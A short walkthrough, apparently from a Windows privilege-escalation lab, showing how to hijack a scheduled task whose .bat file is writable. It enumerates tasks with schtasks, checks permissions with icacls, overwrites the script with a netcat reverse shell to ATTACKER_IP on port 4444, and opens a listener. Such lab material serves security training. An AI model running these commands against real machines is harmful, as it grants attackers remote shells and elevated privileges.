Scheduled Tasks: 
Scheduled tasks can be listed from the command line using:
1. schtasks
To retrieve detailed information about any of the services, you can use a command like the following one:
2. schtasks /query /tn vulntask /fo list /v
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user,
resulting in a simple privilege escalation. To check the file permissions on the executable:
3. icacls c:\tasks\schtask.bat
group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.
Let's change the bat file to spawn a reverse shell:
4. echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
5. nc -lvp 4444
The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges.
